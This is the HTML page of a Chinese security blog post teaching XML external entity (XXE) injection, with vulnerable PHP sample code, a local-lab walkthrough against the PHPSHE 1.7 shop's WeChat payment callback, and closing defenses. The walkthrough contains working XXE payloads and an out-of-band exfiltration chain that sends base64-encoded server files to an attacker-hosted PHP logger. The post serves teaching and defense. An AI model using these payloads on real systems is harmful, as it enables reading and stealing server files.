@@ -1,0 +1,218 @@
+<script type="text/javascript" src="/js/crash_cheat.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>一次面试引发的XXE学习 | jasson个人博客</title><meta name="keywords" content="web安全,xxe,xml,外部实体"><meta name="author" content="jasson"><meta name="copyright" content="jasson"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一次面试引发的XXE学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次面试引发的XXE学习">
+<meta property="og:url" content="https://j-jasson2.github.io/2020/11/05/%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E5%BC%95%E5%8F%91%E7%9A%84XXE%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="jasson个人博客">
+<meta property="og:description" content="一次面试引发的XXE学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2F5b0988e595225.cdn.sohucs.com%2Fimages%2F20170830%2F278c768085a743e8850561b1bc33f104.jpeg&refer=http%3A%2F%2F5b0988e595225.cdn.sohucs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630747032&t=c7b74bfc2b5a10bcac1cda86889c9cdd">
+<meta property="article:published_time" content="2020-11-05T08:45:44.000Z">
+<meta property="article:modified_time" content="2021-08-26T03:34:32.307Z">
+<meta property="article:author" content="jasson">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="xxe">
+<meta property="article:tag" content="xml外部实体注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2F5b0988e595225.cdn.sohucs.com%2Fimages%2F20170830%2F278c768085a743e8850561b1bc33f104.jpeg&refer=http%3A%2F%2F5b0988e595225.cdn.sohucs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630747032&t=c7b74bfc2b5a10bcac1cda86889c9cdd"><link rel="shortcut icon" href="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&refer=http%3A%2F%2Finews.gtimg.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630728108&t=1576409e5f212dd7279b9a1c880c7086"><link rel="canonical" href="https://j-jasson2.github.io/2020/11/05/%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E5%BC%95%E5%8F%91%E7%9A%84XXE%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '一次面试引发的XXE学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-08-26 11:34:32'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">62</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://gimg2.baidu.com/image_search/src=http%3A%2F%2F5b0988e595225.cdn.sohucs.com%2Fimages%2F20170830%2F278c768085a743e8850561b1bc33f104.jpeg&amp;refer=http%3A%2F%2F5b0988e595225.cdn.sohucs.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630747032&amp;t=c7b74bfc2b5a10bcac1cda86889c9cdd')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">jasson个人博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">一次面试引发的XXE学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-05T08:45:44.000Z" title="发表于 2020-11-05 16:45:44">2020-11-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-26T03:34:32.307Z" title="更新于 2021-08-26 11:34:32">2021-08-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="一次面试引发的XXE学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><meta name="referrer" content="no-referrer"/>
+
+<blockquote>
+<p>文章已发布到公众号：广软NSDA安全团队<br>标题：面试某公司渗透岗引发的XXE学习<br>链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA">https://mp.weixin.qq.com/s/5g4BH-1GFgQ8MyuQ2N30GA</a></p>
+</blockquote>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚刚进行了某公司渗透岗的面试，经历过多次面试的我发现，面试官很喜欢问XXE漏洞，而这也是很多人所不了解或者了解有限的，这里我希望通过一篇推文，让大家入门XXE漏洞，对于以后的面试甚至工作有所帮助。</p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XML External Entity 即外部实体，从安全角度理解为XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，可以允许引入外部实体，攻击者通过伪造外部实体而触发漏洞。<br>通俗点就是我们可以控制它解析我们传入的来自外部的实体而造成的漏洞。</p>
+<h1 id="XML外部实体注入攻击"><a href="#XML外部实体注入攻击" class="headerlink" title="XML外部实体注入攻击"></a>XML外部实体注入攻击</h1><p>接下来我将对XML外部实体注入进行拆分解释：<br>1.XML<br>       可扩展标记语言（可以自己发明标签；在HTML中标签已经被预定义好了，可以直接使用）<br>类似HTML<br>设计宗旨为传输数据而非显示数据<br>标签未定义<br>自我描述性<br>W3C标准<br>（总结：XML就是用来存储传输数据的、可以自己发明标签）</p>
+<p>2.外部实体：外部的DTD（后面详细介绍什么是DTD部分）<br>3.注入（所有注入都可以这样定义）：<br>              1.用户能够控制输入<br>              2.用户输入的数据被拼接到了原本要执行的代码一起执行</p>
+<h1 id="标准的XXE攻击payload"><a href="#标准的XXE攻击payload" class="headerlink" title="标准的XXE攻击payload"></a>标准的XXE攻击payload</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807027-8d35847c-5340-4ef7-8862-b5120c4ca214.png#align=left&display=inline&height=146&margin=%5Bobject%20Object%5D&originHeight=288&originWidth=816&status=done&style=none&width=415"><br>       XML声明 - 类似PHP的<?php?>、用来声明此为XML<br>       DTD – 可以理解为模板或规则，这里定义了一个标签foo以及通过file伪协议读取了/etc/passwd的内容<br>       XML部分 调用了DTD部分定义的东西来执行，就如HTML中的标签，我们直接引用<h1>xxe</h1>表示将xxe作为1级标题加大&amp;加粗字体。（只不过在XML中我们需要自己定义标签的含义）</p>
+<h1 id="我是这样理解XXE漏洞的："><a href="#我是这样理解XXE漏洞的：" class="headerlink" title="我是这样理解XXE漏洞的："></a>我是这样理解XXE漏洞的：</h1><p>1、 可以传参XML内容<br>2、 XML内容会被放到代码中执行<br>3、 传入恶意的DTD部分，使用SYSTEM与伪协议读取敏感信息或执行其他伪协议操作</p>
+<h1 id="从代码层面出发理解XXE："><a href="#从代码层面出发理解XXE：" class="headerlink" title="从代码层面出发理解XXE："></a>从代码层面出发理解XXE：</h1><p>PHP中存在一个函数：<br>simplexml_load_string(‘XML内容’,’SimpleXMLElement’,LIBXML_NOENT)<br>作用是将XML转化为对象</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807365-68cd40c2-5126-406d-a912-dc67650d2ace.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&originHeight=478&originWidth=1450&status=done&style=none&width=415"><br>这里写段简单的代码看看效果：<br>1、 在C盘放一个flag.txt文件，内容为this is good flag.<br>2、 写一段PHP代码，通过simplexml_load_string解析XML内容，读取flag.txt的内容并输出<br>附上代码，可以自己尝试，注意需要web环境，可以通过phpstudy快速搭建：<br><?php
+       $a = '<!DOCTYPE scan [<!ENTITY test SYSTEM "file:///C:/flag.txt">]><scan>&test;</scan>';
+       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);
+       print($b);
+       ?></p>
+<p>是不是没什么感觉呢，那么我修改代码看看：<br><?php
+       @$a = file_get_contents("php://input");
+       $b = simplexml_load_string($a, 'SimpleXMLElement', LIBXML_NOENT);
+       print($b);
+       ?><br>这里可以看到原来的xml没了，变成了通过读取POST传输的数据，那么我们传参原来的payload，一样可以利用。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807673-117ec659-7045-43e0-b742-cd1d4b03ddf5.png#align=left&display=inline&height=164&margin=%5Bobject%20Object%5D&originHeight=494&originWidth=1247&status=done&style=none&width=415"></p>
+<h1 id="XXE无回显"><a href="#XXE无回显" class="headerlink" title="XXE无回显"></a>XXE无回显</h1><p>现在就要考虑另一个问题了，因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到，在上面的实验代码中可以通过删除最后的print($b)来实现这样的操作。XXE不回显问题当然也是有解决办法的，不知道大家接触过DNSLOG吗，可以通过咋域名前面放入查询出的内容，将数据通过dns日志记录下来。<br>XXE虽然不是通过DNSlog，但是也同样是外带数据。<br>流程如下：<br>在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。<br>具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上的。<br>1.xml<br>              &lt;!ENTITY% all “<!ENTITY &#x25; send SYSTEM 'http://攻击者的IP地址/2.php?id=%file;'>“&gt;%all;<br>2.php<br>              <?php file_put_contents("3.txt",$_GET["id"],FILE_APPEND);?><br>3.txt<br>       内容空</p>
+<h1 id="实战演示："><a href="#实战演示：" class="headerlink" title="实战演示："></a>实战演示：</h1><p>下面我将以PHPSHE1.7 cms来进行实战讲解<br>1、 首先下载获取源码，在全局中搜索解析xml的函数simplexml_load_string，获取到2个php文件<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317807995-b6b408a1-1c2c-42d7-8a3e-d06d5b6da135.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&originHeight=687&originWidth=1641&status=done&style=none&width=415"><br>2、 在include/function/global.func.php文件中可以看到，很熟悉的操作，通过php://input获取POST传参的内容，然后进行解析。（json_decode( )    —- json 转 对象/数组）<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808483-5b780c7d-d926-44c6-981a-a02cc1ce5da5.png#align=left&display=inline&height=40&margin=%5Bobject%20Object%5D&originHeight=128&originWidth=1331&status=done&style=none&width=415"><br>3、 这里因为是在函数pe_getxml中，所以还需要全局搜索看看哪些php文件调用了这个函数<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808778-ff3a23f4-6fa9-4caa-9c11-8cf42d7f3e2c.png#align=left&display=inline&height=59&margin=%5Bobject%20Object%5D&originHeight=135&originWidth=946&status=done&style=none&width=415"><br>4、 第二个明显不是了，那就只能看第一个，点击查看代码<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809168-eeeba45c-8bbc-4061-9cd5-87a52e583ca2.png#align=left&display=inline&height=56&margin=%5Bobject%20Object%5D&originHeight=106&originWidth=788&status=done&style=none&width=415"><br>5、 又在一个函数中，可以看到这个是接收微信xml数据的，那么我们再全局搜索wechat_getxml函数<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809522-3fdb9992-647f-4dd3-a4d8-513fec09f00b.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&originHeight=167&originWidth=1035&status=done&style=none&width=415"><br>6、 可以定位到/include/plugin/payment/wechat/notify_url.php文件<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809899-7219a65d-c02c-4a35-ba44-cec786004556.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&originHeight=593&originWidth=1126&status=done&style=none&width=415"><br>7、 现在就已经发现了漏洞利用链，首先notify_url.php文件调用了wechat_getxml函数，wechat_getxml函数调用了pe_getxml函数，pe_getxml函数存在XXE漏洞，这里明显没有输出解析后的内容，即XXE无回显，所以我们还需要一台攻击机，在里面放上1.xml、2.php、3.txt<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810126-a505d447-4590-4ed6-87eb-1c00d48de8af.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&originHeight=231&originWidth=718&status=done&style=none&width=415"><br>8、 内容如下：<br>1.xml<br><!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://192.168.229.1/xxe/2.php?id=%file;'>“&gt;%all;<br>2.php<br><?php file_put_contents("3.txt",$_GET["id"],FILE_APPEND);?><br>3.txt<br>内容空<br>9、 接下来搭建环境，通过phpstudy傻瓜式搭建phpshe网站<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810576-8dffa83a-e1a2-4f82-b199-643e379a0cab.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&originHeight=888&originWidth=1630&status=done&style=none&width=416"><br>10、          访问存在漏洞的文件，确定文件是否存在，文件路径：/include/plugin/payment/wechat/notify_url.php<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810985-db91fa42-6f99-4248-a982-bccb78a1ddc3.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&originHeight=449&originWidth=1047&status=done&style=none&width=416"><br>11、          可以看到，页面空白，说明确实存在这个页面。然后看看这次要获取的内容为服务器网站目录下的flag.txt文件，内容为This is my important data.。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317811565-6239b783-6629-4700-a217-a5245cfd7472.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=640&originWidth=1201&status=done&style=none&width=416"><br>12、          接下来开始攻击，抓取该页面的数据包，修改传参方式为post，放上payload<br>payload：<br><?xml version="1.0"?><br><!DOCTYPE ANY[
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/phpStudy/WWW/flag.txt"><br><!ENTITY % remote SYSTEM "http://192.168.229.1/xxe/1.xml"><br>%remote;<br>%send;<br>]&gt;<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812027-9555a8ec-3c57-4526-8d5a-9ff888bdb1b7.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&originHeight=263&originWidth=896&status=done&style=none&width=416"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812280-8c2d2d56-24f7-453b-a597-2cbb522d57ce.png#align=left&display=inline&height=151&margin=%5Bobject%20Object%5D&originHeight=379&originWidth=1043&status=done&style=none&width=415"><br>13、          放包，回去查看3.txt，发现已经有获取到内容了<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812577-94b84759-c4ae-48c6-b9cc-5104fe517397.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&originHeight=239&originWidth=674&status=done&style=none&width=404"><br>14、          Base64解密，获取信息<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812955-ffd2d37e-56f8-4fa0-846c-75ffe1365e55.png#align=left&display=inline&height=160&margin=%5Bobject%20Object%5D&originHeight=518&originWidth=1350&status=done&style=none&width=416"></p>
+<h1 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h1><p>1.     使用开发语言提供的禁用外部实体的方法<br>PHP：<br>libxml_disable_entity_loader(true);</p>
+<p>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);</p>
+<p>Python：<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
+<p>2.     过滤关键词：SYSTEM、PUBLIC等</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">jasson</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://j-jasson2.github.io/2020/11/05/%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E5%BC%95%E5%8F%91%E7%9A%84XXE%E5%AD%A6%E4%B9%A0/">https://j-jasson2.github.io/2020/11/05/一次面试引发的XXE学习/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://j-jasson2.github.io" target="_blank">jasson个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a><a class="post-meta__tags" href="/tags/xxe/">xxe</a><a class="post-meta__tags" href="/tags/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/">xml外部实体注入</a></div><div class="post_share"><div class="social-share" data-image="https://gimg2.baidu.com/image_search/src=http%3A%2F%2F5b0988e595225.cdn.sohucs.com%2Fimages%2F20170830%2F278c768085a743e8850561b1bc33f104.jpeg&amp;refer=http%3A%2F%2F5b0988e595225.cdn.sohucs.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630747032&amp;t=c7b74bfc2b5a10bcac1cda86889c9cdd" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/11/09/%E8%A2%AB%E5%BF%BD%E8%A7%86%E7%9A%84%E6%BC%8F%E6%B4%9E-CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"><img class="prev-cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.pianshen.com%2Fimages%2F744%2F5338f05ea641c337635df38c44dcd4f0.png&amp;refer=http%3A%2F%2Fwww.pianshen.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630747376&amp;t=8d4387e192b14d4412c6f21e854951f5" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">被忽视的漏洞-CSRF跨站请求伪造</div></div></a></div><div class="next-post pull-right"><a href="/2020/10/02/CVE-2019-2888-weblogic-XXE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><img class="next-cover" src="/images/17/3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">(CVE-2019-2888)weblogic-XXE漏洞复现</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/08/07/Nginx中间件漏洞之add_header被覆盖/" title="Nginx中间件漏洞之add_header被覆盖"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-07</div><div class="title">Nginx中间件漏洞之add_header被覆盖</div></div></a></div><div><a href="/2021/08/05/Nginx中间件漏洞之CRLF注入/" title="Nginx中间件漏洞之CRLF注入"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-05</div><div class="title">Nginx中间件漏洞之CRLF注入</div></div></a></div><div><a href="/2021/08/06/Nginx中间件漏洞之目录穿越/" title="Nginx中间件漏洞之目录穿越"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F3778244-65c62b2e2775b20a.png%3FimageMogr2%2Fauto-orient%2Fstrip%257CimageView2%2F2%2Fw%2F1240&refer=http%3A%2F%2Fupload-images.jianshu.io&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630941831&t=6d3fe55cc7cb43085f42e676981de631" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-06</div><div class="title">Nginx中间件漏洞之目录穿越</div></div></a></div><div><a href="/2020/03/08/SQL注入全方位利用之显错注入/" title="SQL注入全方位利用之显错注入"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.shangdixinxi.com%2Fup%2Finfo%2F202006%2F20200604170532028792.png&refer=http%3A%2F%2Fimg.shangdixinxi.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630916300&t=5efb5b64bc17ac6be7c880a5fa3db56b" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-08</div><div class="title">SQL注入全方位利用之显错注入</div></div></a></div><div><a href="/2020/05/12/干货：SQL注入如何绕过WAF/" title="干货：SQL注入如何绕过WAF"><img class="cover" src="/images/sql.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-12</div><div 